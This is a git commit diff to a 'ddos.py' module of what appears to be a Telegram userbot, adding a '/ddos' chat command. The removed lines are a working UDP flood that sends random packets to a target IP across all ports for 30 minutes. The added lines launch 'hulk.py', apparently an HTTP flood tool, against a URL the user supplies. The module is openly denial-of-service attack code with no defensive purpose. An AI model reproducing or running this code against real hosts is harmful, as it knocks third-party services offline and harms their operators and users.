6fcb24dc481a2eabf3fc9f5677881bc26b597a47
Ayush Chatterjee <54566209+Ayush1311@users.noreply.github.com>
2020-09-10 22:11:28 +0530

    Update ddos.py

--- alexa/modules/ddos.py
+++ alexa/modules/ddos.py
@@ -4,22 +4,15 @@ import time
 import socket
 import random
 from alexa.events import alexabot
+import subprocess
 
-@alexabot(outgoing=True, pattern="/ddos (.*) (.*)")
+@alexabot(outgoing=True, pattern="/ddos (.*)")
 async def ddos(event): 
-  ip = event.pattern_match.group(1)
-  portt = event.pattern_match.group(2)
-  
-  port = int(portt)
-  timeout = 1800
-  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  bytes = random._urandom(1490)
-  sent = 0
+  url = event.pattern_match.group(1)
+  cmnd = f"{url}"
+  timeout = 600
   timeout_start = time.time()
-  while time.time() < timeout_start + timeout:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print(f"sending {sent} no packets to {port}")
-     if port == 65534:
-       port = 1
+  if time.time() < timeout_start + timeout:
+     subprocess.run(["python", "hulk.py", cmnd, "safe"])
+  elif time.time() >= timeout_start + timeout:
+     raise KeyboardInterrupt
